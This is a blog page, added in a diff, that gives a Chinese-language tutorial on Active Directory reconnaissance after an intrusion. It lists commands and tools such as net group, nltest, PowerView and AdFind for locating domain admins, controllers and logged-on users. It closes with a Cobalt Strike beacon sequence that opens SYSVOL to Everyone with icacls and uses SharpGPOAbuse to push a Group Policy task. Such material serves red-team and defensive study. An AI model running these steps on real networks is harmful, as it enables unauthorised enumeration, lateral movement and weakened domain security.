@@ -1,0 +1,384 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    
+<meta charset="utf-8" >
+
+<title>域内信息收集 | pyroxenite</title>
+<meta name="description" content="温故而知新">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://pyroxenites.github.io/favicon.ico?v=1685337865502">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://pyroxenites.github.io/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+      <div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="https://pyroxenites.github.io">
+        <img class="avatar" src="https://pyroxenites.github.io/images/avatar.png?v=1685337865502" alt="" width="32px" height="32px">
+      </a>
+      <a href="https://pyroxenites.github.io">
+        <h1 class="site-title">pyroxenite</h1>
+      </a>
+    </div>
+    <div class="right">
+      <transition name="fade">
+        <i class="icon" :class="{ 'icon-close-outline': menuVisible, 'icon-menu-outline': !menuVisible }" @click="menuVisible = !menuVisible"></i>
+      </transition>
+    </div>
+  </div>
+</div>
+
+<transition name="fade">
+  <div class="menu-container" style="display: none;" v-show="menuVisible">
+    <div class="menu-list">
+      
+        
+          <a href="/" class="menu purple-link">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="menu purple-link">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="menu purple-link">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="menu purple-link">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+</transition>
+
+
+      <div class="content-container">
+        <div class="post-detail">
+          
+          <h2 class="post-title">域内信息收集</h2>
+          <div class="post-info post-detail-info">
+            <span><i class="icon-calendar-outline"></i> 2022-03-28</span>
+            
+          </div>
+          <div class="post-content" v-pre>
+            <h2 id="域管">域管</h2>
+<ol>
+<li>net group &quot;Domain Admins&quot; /domain</li>
+</ol>
+<figure data-type="image" tabindex="1"><img src="https://pyroxenites.github.io/post-images/1649748388510-35da7667-be6d-4a23-961e-be0dc12e89e9.png" alt="image.png" loading="lazy"></figure>
+<ol start="2">
+<li>通过tasklist /v 列出本地进程的所有者</li>
+</ol>
+<figure data-type="image" tabindex="2"><img src="https://pyroxenites.github.io/post-images/1649748411316-caa4b63d-0469-4350-8102-4cf69ad09ccc.png" alt="image.png" loading="lazy"></figure>
+<hr>
+<h2 id="域控">域控</h2>
+<ol>
+<li>net group &quot;Domain controllers&quot; /Domain</li>
+</ol>
+<figure data-type="image" tabindex="3"><img src="https://pyroxenites.github.io/post-images/1649748427910-63c51a14-7bee-4d36-a554-5c2f99df1420.png" alt="image.png" loading="lazy"></figure>
+<ol start="2">
+<li>net time /domain</li>
+</ol>
+<figure data-type="image" tabindex="4"><img src="https://pyroxenites.github.io/post-images/1649748635589-5e9c377e-db86-4e44-8fb7-a1fc15219fde.png" alt="image.png" loading="lazy"></figure>
+<ol start="3">
+<li>nslookup</li>
+</ol>
+<figure data-type="image" tabindex="5"><img src="https://pyroxenites.github.io/post-images/1649748504263-be94d55e-e4ea-4c96-b05b-a776cfb4a592.png" alt="image.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://pyroxenites.github.io/post-images/1649748531628-6b616324-e366-4950-bd6d-a91e76bbc96a.png" alt="image.png" loading="lazy"></figure>
+<ul>
+<li>通过查询DNS SRV的记录来定位域控的两条命令</li>
+</ul>
+<pre><code class="language-go">nslookup -type=SRV _ldap._tcp.dc._msdcs.loca.test.com
+nltest /dsgetdc:loca.test.com
+</code></pre>
+<p>这里我们得知10.0.0.4为域控ip，我们可以进行扫描端口，来进行确认</p>
+<p><img src="https://pyroxenites.github.io/post-images/1649902394261-231dbeb3-8e98-44f2-9052-954b119597e9.png" alt="image.png" loading="lazy"><br>
+因为域控一般为DNS服务器，所以会开启53端口<br>
+88端口是kerberos协议的端口<br>
+389端口是ldap协议的端口</p>
+<hr>
+<h2 id="获取域信任">获取域信任</h2>
+<p>nltest /domain_trusts<br>
+<img src="https://pyroxenites.github.io/post-images/1649748562781-40649488-9425-4e0f-8b94-4006fc147ea8.png" alt="image.png" loading="lazy"></p>
+<h2 id="获取域密码设置规则">获取域密码设置规则</h2>
+<p>net accounts /domain<br>
+<img src="https://pyroxenites.github.io/post-images/1649748576031-95aa8c07-6a74-4580-a264-4ec92c35bbbf.png" alt="image.png" loading="lazy"></p>
+<h2 id="查询所有域成员计算机列表">查询所有域成员计算机列表</h2>
+<p>net group &quot;domain computers&quot; /domain</p>
+<figure data-type="image" tabindex="7"><img src="https://pyroxenites.github.io/post-images/1649748592639-af8e421a-11d2-478c-9d68-acc7d7265074.png" alt="image.png" loading="lazy"></figure>
+<h2 id="查询当前登录域以及登录用户信息"><strong>查询当前登录域以及登录用户信息</strong></h2>
+<p>net config workstation<br>
+<img src="https://pyroxenites.github.io/post-images/1649748613776-1624e423-d8c7-43b8-91b3-429b26f0f3b5.png" alt="image.png" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1649055543303-1ee09be0-3fea-40ed-b8ed-ba38038b39e9.png" alt="image.png" loading="lazy"></p>
+<h2 id="效果反馈-判断自己是否在域中">效果反馈-判断自己是否在域中</h2>
+<blockquote>
+<p>net time /domain 效果</p>
+</blockquote>
+<ul>
+<li>如果当前主机处于工作组中未加入域，则显示找不到域控制器</li>
+</ul>
+<figure data-type="image" tabindex="8"><img src="https://pyroxenites.github.io/post-images/1649748680667-392c171c-175c-442c-99a9-61447ca3c1a2.png" alt="image.png" loading="lazy"></figure>
+<ul>
+<li>加入了域，且当前用户为本地用户包括本地管理员，则显示拒绝访问<br>
+<img src="https://pyroxenites.github.io/post-images/1647933612825-c0febd8d-74c6-492f-a9af-aed1891e3a30.png" alt="image.png" loading="lazy"></li>
+<li>加入了域，且当前用户域用户，则显示域控的时间</li>
+</ul>
+<figure data-type="image" tabindex="9"><img src="https://pyroxenites.github.io/post-images/1649748654827-ba091c9d-f084-4558-8d47-34ae643179f6.png" alt="image.png" loading="lazy"></figure>
+<blockquote>
+<p>ipconfig /all</p>
+</blockquote>
+<p>当前主机如果是工作组中，则主DNS后缀为空。如果加入了域则主DNS为域名</p>
+<ol>
+<li>工作组中</li>
+</ol>
+<figure data-type="image" tabindex="10"><img src="https://pyroxenites.github.io/post-images/1649748754548-a79632af-ee77-497b-abb5-31fc06a2c3da.png" alt="image.png" loading="lazy"></figure>
+<p>只要没有加入域，主机的网卡不管有没有自定义dns服务器ip。 执行 ipconfg /all 后主DNS后缀都为空</p>
+<ol start="2">
+<li>域环境中</li>
+</ol>
+<p>只要加入域，不管当前用户为域用户本还是本地用户，主DNS后缀，都为域名<br>
+<img src="https://pyroxenites.github.io/post-images/1649748775013-4b81ac3f-99d8-47c9-97d3-184f875f82cd.png" alt="image.png" loading="lazy"></p>
+<blockquote>
+<p>systeminfo</p>
+</blockquote>
+<p>工作组环境systeminfo查询的显示为WORKGROUP，域环境查询的域是域名<br>
+<img src="https://pyroxenites.github.io/post-images/1649748839924-4c493aac-5c9f-4634-a53c-be9014a930fa.png" alt="image.png" loading="lazy"><br>
+域中，不管此时是什么用户登陆。查询的域是域名<br>
+<img src="https://pyroxenites.github.io/post-images/1649748869652-2042a5c7-efc9-4937-a757-b80fd3c8fdb3.png" alt="image.png" loading="lazy"></p>
+<h2 id="域管理员不在本地机器怎么办">域管理员不在本地机器怎么办</h2>
+<blockquote>
+<p>定位域用户正在登录的主机有两种常规方法，一是日志，二是会话</p>
+</blockquote>
+<p><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon">psloggedon</a></p>
+<blockquote>
+<p>使用psloggedon.exe,可以查看本地登录的用户和通过本地计算机或远程计算机的资源登录的用户。<br>
+如果指定的是用户名而不是计算机名,psloggedon.exe会搜索网上邻居中的计算机,并显示该用户当<br>
+前是否已经登录。其原理是通过检查注册表HKEY_ USERS项的key值来查询谁登录过(需要调用<br>
+NetSessionEnum API),但某些功能需要管理员权限才能使用。</p>
+</blockquote>
+<pre><code class="language-cpp">psloggedon [-] [-l] [-x] [\\computername|username]
+
+-:显示支持的选项和用于输出值的单位。
+-l:仅显示本地登录，不显示本地和网络资源登录。
+-x:不显示登录时间。
+\\computername:指定要列出登录信息的计算机的名称。
+Username:指定用户名，在网络中搜索该用户登录的计算机。
+</code></pre>
+<pre><code class="language-vbnet">psloggedon.exe whoamianony\administrator
+</code></pre>
+<figure data-type="image" tabindex="11"><img src="https://pyroxenites.github.io/post-images/1651470251743-0893a968-d4de-447c-9936-557a2825506e.png" alt="image.png" loading="lazy"></figure>
+<p><a href="https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn">PVEFindADUser</a></p>
+<blockquote>
+<p>可用于查找活动目录用户登陆的位置、枚举域用户，以及查找在特定计算机上登陆的用户，包括查找本地用户、通过 RDP 远程桌面登陆的用户、通过运行服务和计划任务的用户。运行该工具需要计算机配置 .NET Framework 2.0 环境<br>
+PVEFindADUser.exe &lt;参数&gt;<br>
+一般直接运行以下命令，即可显示域中所有计算机上当前登陆的所有用户<br>
+PVEFindADUser.exe -current</p>
+</blockquote>
+<p>也可以通过-target指定查询的主机</p>
+<blockquote>
+<p>PVEFindADUser.exe -current -target DC.whoamianony.org</p>
+</blockquote>
+<p><a href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView">PowerView</a></p>
+<blockquote>
+<p>脚本可以用来获取当前域管理员在线登录的主机，其依赖 PowerShell 和 WMI，是一个收集域信息很好用的脚本</p>
+</blockquote>
+<p>Invoke-UserHunter：搜索域管理员当前在线登录的主机，并验证当前用户是否具有对这些主机的本地管理员访问权限。它可以使用 Get-NetSessions 和Get-NetLoggedon 扫描每台服务器并对扫描结果进行比较，从而找出目标用户集，并且无需管理员权限</p>
+<pre><code class="language-vbnet">Import-Module .\powerview.ps1
+Invoke-UserHunter
+</code></pre>
+<h3 id="win-api">win API</h3>
+<p>NetSessionEnum</p>
+<blockquote>
+<p>一个 Win32 API，用来提供有关在服务器上建立的会话的信息</p>
+</blockquote>
+<pre><code class="language-vbnet">NET_API_STATUS NET_API_FUNCTION NetSessionEnum(
+LMSTR   servername,
+LMSTR   UncClientName,
+LMSTR   username,
+DWORD   level,
+LPBYTE  *bufptr,
+DWORD   prefmaxlen,
+LPDWORD entriesread,
+LPDWORD totalentries,
+LPDWORD resume_handle
+);
+</code></pre>
+<p>这个 API 的第一个参数是servername，我们可以通过servername指定一个远程的主机，然后这个 API 会去调用远程主机的 RPC，然后返回其他用户在访问这台远程主机的网络资源（例如文件共享）时所创建的网络会话，从而可以看到这个用户来自何处。<br>
+但是该 API 并不能查询到是谁登陆了这台远程主机，但是可以看到访问这台远程主机的网络资源时所创建的网络会话。从这个网络会话中可以看到哪个域用户来自哪个 IP。并且该 API 不需要在远程主机上有管理员权限</p>
+<p>NetWkstaUserEnum</p>
+<blockquote>
+<p>这个 API 来列出当前登录到这台远程主机机器的所有用户的信息</p>
+</blockquote>
+<pre><code class="language-vbnet">NET_API_STATUS NET_API_FUNCTION NetWkstaUserEnum(
+LMSTR   servername,
+DWORD   level,
+LPBYTE  *bufptr,
+DWORD   prefmaxlen,
+LPDWORD entriesread,
+LPDWORD totalentries,
+LPDWORD resumehandle
+);
+</code></pre>
+<p>这个 API 的第一个参数也是servername可以指定一个远程主机，然后会去调用这台远程主机的 RPC，然后返回当前登录到这台远程主机的所有用户的信息。值得注意的是，调用该函数的用户需要具备机器A的本地管理员权限。但是该 API 需要在远程主机上有管理员权限</p>
+<blockquote>
+<p>目前有很多工具可以用来枚举域内某台主机上正在登陆的域用户，其本质还是调用了这两个 API</p>
+</blockquote>
+<p>其他</p>
+<blockquote>
+<p><a href="https://www.secpulse.com/archives/32859.html">https://www.secpulse.com/archives/32859.html</a></p>
+</blockquote>
+<h2 id="域用户">域用户</h2>
+<blockquote>
+<p>域环境中的用户。和本地用户的帐户不同，域用户帐户保存在活动目录中。由于所有的用户帐户都集中保存在活动目录中，所以使得集中管理变成可能。<br>
+我们知道，在工作组环境中，所有计算机是独立的，要让用户能够登录到计算机并使用计算机的资源，必须为每个用户建立本地用户帐户。而在域环境中，一个域用户可以在域中的任何一台计算机上登录，域用户可以不再使用固定的计算机。当计算机出现故障时，域用户可以登录到另一台计算机上继续工作，这样也使帐号的管理变得简单。<br>
+域用户账户是在域内全局组 Domain Users 组中，本地用户账户在本地 User 组中。当计算机加入域时，会把 Domain Users 组添加到本地的 User 组中。因此域用户可以在域中的任何一台计算机上登录。</p>
+</blockquote>
+<p>当我们拥有一个域用户的权限时，可以枚举域内的所有用户，此时主要有两个方法。</p>
+<ol>
+<li>通过 SAMR 协议查询</li>
+</ol>
+<pre><code class="language-python">net user /domain
+</code></pre>
+<figure data-type="image" tabindex="12"><img src="https://pyroxenites.github.io/post-images/1649748891795-703cede6-bbd4-4c4c-9086-1ca31a5e2341.png" alt="image.png" loading="lazy"></figure>
+<ol start="2">
+<li>通过 Active Directory 查询</li>
+</ol>
+<pre><code class="language-python">Adfind.exe -b dc=whoamianony,dc=org -f &quot;(&amp;(objectCategory=person)(objectClass=user))&quot; -dn
+</code></pre>
+<p>在域环境中，域用户默认是可以登录域内任何一台机器的，这是因为域管理员在新增域用户时该域用户默认就会存在域用户组 Domain Users 中，加入域的域成员机器会默认将全局组 Domain Users 加到其本地的 User 组中，而域成员机器本地组策略中的 “允许在本地登陆” 属性中包含了本地的 Users 组。</p>
+<p>但是这样可能会存在一些安全隐患，所以域管理员为了安全起见，通常会限制域用户只能登陆指定的计算机，或限制某台计算机只允许指定的用户登录。具体操作有以下两种。<br>
+对域用户做限制，设置域用户只能登陆指定的计算机</p>
+<figure data-type="image" tabindex="13"><img src="https://pyroxenites.github.io/post-images/1648533637277-4a528662-6110-4019-b2d8-e346c32b9302.png" alt="image.png" loading="lazy"></figure>
+<p>设置该域用户只允许登录到 Client-PC 这台机器。<br>
+对机器做限制，限制某台计算机只允许指定的用户登录<br>
+这个可以通过下发组策略实现<br>
+<img src="https://pyroxenites.github.io/post-images/1648533674271-ffbb7f7e-8555-4b4b-a8e4-f694f7a909ea.png" alt="image.png" loading="lazy"><br>
+这台计算机运行 Administrators 组和 Users 组的用户登录，如果此时需要设置不再允许 Users 组的用户登录的话，直接将 Users 组从里面删掉即可<br>
+<img src="https://cdn.nlark.com/yuque/0/2022/jpeg/8363097/1648533689102-73bf71e3-06af-4d1c-bea7-b7a8ee4980a2.jpeg#clientId=ubd2c2e03-6980-4&amp;from=paste&amp;id=ua57f870d&amp;originHeight=441&amp;originWidth=690&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=u3042c81f-5514-41fb-871c-e411e47ec58&amp;title=" alt="" loading="lazy"><br>
+也可以直接在 “允许本地登陆” 中添加想要登陆的组和域成员名。</p>
+<h3 id="查找指定用户能够登录的主机">查找指定用户能够登录的主机</h3>
+<p>在限制了域用户只能登录到某台主机之后，在 Active Directory 里面，会为该域用户设置一个userWorkStations属性。这个属性保存了这个域用户能够登录到的主机。而这个字段对于域内任何用户都是可读的，我们可以通过读域用户的userWorkStations属性来查看域用户能够登录的主机</p>
+<blockquote>
+<p>Adfind.exe -b dc=whoamianony,dc=org -sc u:whoami userWorkstations<br>
+PowerView：<br>
+Import-Module .\powerview.ps1<br>
+Get-NetUser -Domain whoami.whoamianony.org</p>
+</blockquote>
+<h2 id="拿下域管的时候定位成员pc机">拿下域管的时候定位成员pc机</h2>
+<pre><code class="language-go">gpo(组策略管理)下发 query user 写log到sysvol
+</code></pre>
+<figure data-type="image" tabindex="14"><img src="https://cdn.nlark.com/yuque/0/2022/jpeg/8363097/1649056725870-be0a0c60-e4ef-4102-968a-5ee2d77c8a1e.jpeg#clientId=u0a8abc43-ea74-4&amp;from=paste&amp;height=355&amp;id=u10c29d53&amp;originHeight=444&amp;originWidth=640&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=41755&amp;status=done&amp;style=none&amp;taskId=u452ac729-bceb-440f-bdcd-2ecf6b90b6f&amp;title=&amp;width=512" alt="10b4f4de7c98a13774aa1dc65eadba1.jpg" loading="lazy"></figure>
+<h3 id="beacon端">beacon端</h3>
+<ol>
+<li>创建组策略：</li>
+</ol>
+<pre><code class="language-go">powershell Import-Module GroupPolicy;new-gpo -name QueryDomainUser01 
+</code></pre>
+<ol start="2">
+<li>连接到域：</li>
+</ol>
+<pre><code class="language-go">powershell Import-Module GroupPolicy;new-gplink -name QueryDomainUser01 -Target &quot;dc=vulntarget,dc=com&quot;
+</code></pre>
+<ol start="3">
+<li>修改一下sysvol的权限</li>
+</ol>
+<blockquote>
+<p>为了让 sysvol普通域用户也可以写入</p>
+</blockquote>
+<pre><code class="language-go">shell icacls c:\windows\sysvol\ /grant Everyone:(OI)(CI)(F) /T
+</code></pre>
+<ol start="4">
+<li>下发</li>
+</ol>
+<pre><code class="language-go">execute-assembly /root/cs/sharp/SharpGPOAbuse.exe --AddComputerTask --TaskName &quot;QueryDomainUser001&quot; --Authorvulntarget\\administrator --Command &quot;cmd.exe&quot; --Arguments &quot;cmd /c query user &gt;\\win2019.vulntarget.com\sysvol\%COMPUTERNAME%.txt&quot; --GPOName &quot;QueryDomainUser01&quot;
+</code></pre>
+<ol start="5">
+<li>等待90分钟可以直接强制执行了</li>
+</ol>
+<pre><code class="language-go">gpupdate /force
+</code></pre>
+<ol start="6">
+<li>之后去查看 win2019.vulntarget.com\sysvol\ 目录下的文件即可</li>
+</ol>
+<h2 id="小工具">小工具</h2>
+<p><a href="https://github.com/SkewwG/domainTools">https://github.com/SkewwG/domainTools</a></p>
+
+          </div>
+        </div>
+
+        
+          <div class="next-post">
+            <a class="purple-link" href="https://pyroxenites.github.io/post/urldns/">
+              <h3 class="post-title">
+                下一篇：URLDNS
+              </h3>
+            </a>
+          </div>
+          
+      </div>
+
+      
+
+      <div class="site-footer">
+  <div class="slogan">温故而知新</div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+  Powered by pyroxenite | <a class="rss" href="https://pyroxenites.github.io/atom.xml" target="_blank">RSS</a>
+</div>
+
+
+    </div>
+    <script type="application/javascript">
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
